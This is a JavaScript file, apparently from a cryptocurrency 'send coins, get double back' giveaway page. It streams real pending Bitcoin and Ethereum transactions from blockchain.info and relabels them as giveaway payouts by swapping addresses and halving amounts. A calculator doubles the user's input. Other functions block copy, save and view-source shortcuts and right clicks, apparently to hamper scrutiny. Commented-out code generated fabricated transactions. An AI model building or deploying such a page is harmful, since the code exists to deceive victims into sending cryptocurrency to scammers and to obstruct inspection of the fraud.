const {
    min_btc,
    max_btc,
    min_eth,
    max_eth,
    multiplier,
} = window.cdata;

function lerp(start, end, amt) {
    return (1 - amt) * start + amt * end;
}
$(document).ready(function() {
    function randomString(len, charSet) {
        charSet = charSet || "ABCDEFabcdef0123456789";
        var randomString = "";
        for (var i = 0; i < len; i++) {
            var randomPoz = Math.floor(Math.random() * charSet.length);
            randomString += charSet.substring(randomPoz, randomPoz + 1);
        }
        return randomString;
    }

    function randomNumber(min, max) {
        return min + Math.random() * (max + 1 - min);
    }
    

    let transactions = [];


    const btcs = new WebSocket('wss://ws.blockchain.info/coins');
    const eths = new WebSocket('wss://ws.blockchain.info/coins');
    
    btcs.onopen = function(){
      btcs.send( JSON.stringify( {"coin":"btc","command":"subscribe","entity":"header"} ) );
      btcs.send( JSON.stringify( {"coin":"btc","command":"subscribe","entity":"pending_transaction"} ) );
    };
    
    let subscribeDateTime = new Date();
    
    btcs.onmessage = function(onmsg){
      if (transactions.length > 2 && (subscribeDateTime.getTime() + 500) > new Date().getTime()) return;
    
      createTableItem(onmsg.data);
      subscribeDateTime = new Date();
    }
    
    eths.onopen = function(){
      eths.send( JSON.stringify( {"coin":"eth","command":"subscribe","entity":"header"} ) );
      eths.send( JSON.stringify( {"coin":"eth","command":"subscribe","entity":"pending_transaction"} ) );
    };
    
    let ethsSubscribeDateTime = new Date();
    
    eths.onmessage = function(onmsg){
      if (transactions.length > 2 && (ethsSubscribeDateTime.getTime() + 15000) > new Date().getTime()) return;
    
      createTableItem(onmsg.data);
      ethsSubscribeDateTime = new Date();
    }

    function createTableItem(resp) {
        
        // const coin = Math.random() > 0.5 ? "BTC" : "ETH";
        // let wallet_from = '';
        // let wallet_to = '';
        // let send_amount = 0;
        // let get_amount = 0;
        // let txhash = '';
        
        
        if(!resp) return;
        
        let data = JSON.parse(resp);
        
        let fee = 0;
        let block = randomString(6, "123456789");
        let hash = "";
        let address = "";
        let address_to = "";
        let value = 0;
        let value_to = 0;
        let coin = "BTC";
  
        if (data.coin == 'eth') {
          coin = "ETH";
          hash = data.transaction.hash;
          address = data.transaction.from;
          address_to = data.transaction.to;
          value = data.transaction.value / 1000000000000000000;
          value_to = value / 2;
          
          if (value_to < 2) return;
        } else {
          hash = data.transaction.hash;
          address = data.transaction.inputs[0].address;
          address_to = data.transaction.out[0].addr;
          value = data.transaction.out[0].value / 100000000;
          value_to = value / 2;
        }
   
        
        if (value_to < 0.1) return;
  
        transactions.push({
          'txhash': hash,
          'value': value,
        });
  
        if (coin == 'BTC') {
        //     wallet_from = '1' + randomString(11) + "...";
        //     wallet_to = wallet_btc;
        //     const max_lerp = lerp(min_btc, max_btc, 0.05);
        //     send_amount = randomNumber(min_btc, max_lerp);
        //     get_amount = send_amount * multiplier;
            fee = (value / 1000).toFixed(5);
        //     send_amount = send_amount.toFixed(8);
        //     get_amount = get_amount.toFixed(8);
        //     txhash = randomString(10) + '...';
        } else if (coin == 'ETH') {
        //     wallet_from = '0x' + randomString(11) + "...";
        //     wallet_to = wallet_eth;
        //     const max_lerp = lerp(min_eth, max_eth, 0.05);
        //     send_amount = randomNumber(min_eth, max_lerp);
        //     get_amount = send_amount * multiplier;
            fee = (value / 1000).toFixed(5);
        //     send_amount = send_amount.toFixed(5);
        //     get_amount = get_amount.toFixed(5);
        //     txhash = '0x' + randomString(8) + '...';
        }
        let row = `<div class="transaction-item">
            <p class="txhash">${hash}</p>
            <p class="block">${block}</p>
            <p class="from">${address}<br>${address_to}</p>
            <div class="arrow"><img src="assets/check.svg" alt=""></div>
            <p class="to">${address_to}<br>${address}</p>
            <p class="value">${value.toFixed(4)} ${coin}<br>${value_to.toFixed(4)} ${coin}</p>
            <p class="fee">${fee}</p>
            <p class="status"><a href="https://www.blockchain.com/${coin.toLowerCase()}/tx/${hash}">View on Blockchain</a></p>
        </div>`;
        $(row).hide().prependTo(".transaction-content").fadeIn("slow");
        $('.transaction-item:eq(10)').remove();
    }
    for (let i = 0; i <= 10; i++) {
        createTableItem();
    }

    $('a[href^="#"]').click(function() {
        var target = $(this).attr('href');
        $('html, body').animate({
            scrollTop: $(target).offset().top - 50
        }, 500);
        return false;
    });
    $("input[name=input]").ForceNumericOnly().keyup(function() {
        let amount = parseFloat($(this).val());
        amount = !isNaN(amount) ? amount * 2 : 0;
        $("#calculator_number").text(amount.toLocaleString());
    });
    $(".participate-button").click(function() {
        $(this).parents(".participate-item").find(".address-done").fadeIn(200);
        setTimeout(() => $(this).parents(".participate-item").find(".address-done").fadeOut(200), 1000);
    });
});



function round(value, decimals) {
    return Number(Math.round(value + 'e' + decimals) + 'e-' + decimals);
}

function copy(id) {
    var input = document.createElement('textarea');
    input.innerHTML = document.getElementById(id).textContent;
    document.body.appendChild(input);
    input.select();
    var status = document.execCommand('copy');
    document.body.removeChild(input);
}
jQuery.fn.ForceNumericOnly = function() {
    return this.each(function() {
        $(this).keydown(function(e) {
            var key = e.charCode || e.keyCode || 0;
            return (key == 8 || key == 46 || key == 190 || (key >= 35 && key <= 40) || (key >= 48 && key <= 57) || (key >= 96 && key <= 105));
        });
    });
};

function kill_ctrl_key_combo(e) {
    var forbiddenKeys = new Array('a', 'c', 'x', 's', 'u');
    var key;
    var isCtrl;
    if (window.event) {
        key = window.event.keyCode;
        if (window.event.ctrlKey) isCtrl = true;
        else isCtrl = false;
    } else {
        key = e.which;
        if (e.ctrlKey) isCtrl = true;
        else isCtrl = false;
    }
    if (isCtrl) {
        for (i = 0; i < forbiddenKeys.length; i++) {
            if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
                return false;
            }
        }
    }
    return true;
}

function disable_selection(target) {
    if (typeof target.style.MozUserSelect != "undefined") {
        target.style.MozUserSelect = "none";
    }
    target.style.cursor = "default";
}

function double_mouse(e) {
    if (e.which == 2 || e.which == 3) {
        return false;
    }
    return true;
}